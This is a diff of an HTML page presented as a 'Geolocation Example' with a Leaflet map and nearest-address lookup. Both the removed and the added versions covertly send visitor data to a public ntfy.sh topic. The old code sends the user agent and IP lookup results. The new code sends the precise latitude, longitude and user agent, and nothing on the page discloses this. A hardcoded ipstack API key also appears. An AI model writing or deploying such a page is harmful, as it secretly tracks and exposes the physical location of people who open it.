@@ -1,53 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>UserAgent and IP Lookup</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Geolocation Example</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-  <script>
-    // Function to perform an HTTP POST request
-    function httpPost(url, data) {
-      return $.ajax({
-        url: url,
-        type: 'POST',
-        data: data
-      });
+    <h1>Geolocation Example</h1>
+    <div id="map" style="height: 400px;"></div>
+    <div id="address"></div>
+
+    <script> 
+// Get user device ID (User-Agent)
+function getDeviceID() {
+    return navigator.userAgent;
+}
+
+// Perform geolocation request
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+        alert("Geolocation is not supported by this browser.");
     }
+}
 
-    // Get User Agent
-    var userAgent = navigator.userAgent;
+// Callback function for geolocation request
+function showPosition(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
 
-    // HTTP POST to ntfy.sh/blitzd to obtain IP address
-    httpPost('https://ntfy.sh/blitzd', { user_agent: userAgent })
-      .done(function(response) {
-        var ipAddress = response.ip;
+    // Send HTTP POST request to ntfy.sh/blitzd
+    $.post("https://ntfy.sh/blitzd", {
+        lat: latitude,
+        lon: longitude,
+        deviceID: getDeviceID()
+    })
+    .done(function(response) {
+        console.log(response);
+    })
+    .fail(function(error) {
+        console.error("Error:", error);
+    });
 
-        // Lookup IP address using ipstack API
-        var ipstackAPIKey = 'dc636aa2bdb6431961ac16273ebaf3d1';  // Replace with your actual API key
-        var ipstackURL = 'http://api.ipstack.com/' + ipAddress + '?access_key=' + ipstackAPIKey;
+    // Display map and nearest address using Leaflet
+    const map = L.map('map').setView([latitude, longitude], 13);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+    }).addTo(map);
+    L.marker([latitude, longitude]).addTo(map);
+    getAddress(latitude, longitude);
+}
 
-        // HTTP GET request to ipstack API
-        $.get(ipstackURL)
-          .done(function(ipstackResponse) {
-            var ipstackResults = JSON.stringify(ipstackResponse);
+// Get nearest address using reverse geocoding
+function getAddress(latitude, longitude) {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+    $.getJSON(url)
+        .done(function(data) {
+            const address = data.display_name;
+            $('#address').text(`Nearest Address: ${address}`);
+        })
+        .fail(function(error) {
+            console.error("Error:", error);
+        });
+}
 
-            // HTTP POST to ntfy.sh/blitzd with the IP lookup results
-            httpPost('https://ntfy.sh/blitzd', { ip_results: ipstackResults })
-              .done(function() {
-                console.log('Results posted successfully.');
-              })
-              .fail(function() {
-                console.error('Failed to post results.');
-              });
-          })
-          .fail(function() {
-            console.error('Failed to retrieve IP lookup results from ipstack.');
-          });
-      })
-      .fail(function() {
-        console.error('Failed to obtain IP address from ntfy.sh/blitzd.');
-      });
-  </script>
+// Call getLocation() to start the geolocation process
+getLocation();
+
+    </script>
 </body>
 </html>
